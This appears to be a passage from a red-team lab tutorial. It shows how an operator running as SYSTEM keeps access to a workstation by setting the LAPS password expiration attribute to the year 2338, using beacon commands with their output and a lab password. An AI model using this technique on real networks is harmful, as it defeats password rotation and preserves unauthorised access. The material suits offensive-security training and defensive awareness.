If we have the password for a sensitive machine that we'd like to maintain access to, we can prevent a machine from updating its password by setting the expiration date into the future.

```
beacon> powershell Get-DomainObject -Identity wkstn-2 -Properties ms-mcs-admpwdexpirationtime

ms-mcs-admpwdexpirationtime
---------------------------
         132609935231523081
```

The expiration time is an epoch value that we can increase to any arbitrary value. Because the computer accounts are allowed to update the LAPS password attributes, we need to be SYSTEM on said computer.

```
beacon> run hostname
wkstn-2

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> powershell Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```

Now even the native cmdlet reports the expiration date to be the year 2338.

```
beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl

ComputerName        : WKSTN-2
DistinguishedName   : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Password            : P0OPwa4R64AkbJ
ExpirationTimestamp : 2/11/2338 11:05:23 AM
```

>  The password will still reset if an admin uses the `Reset-AdmPwdPassword` cmdlet; or if **Do not allow password expiration time longer than required by policy** is enabled in the LAPS GPO.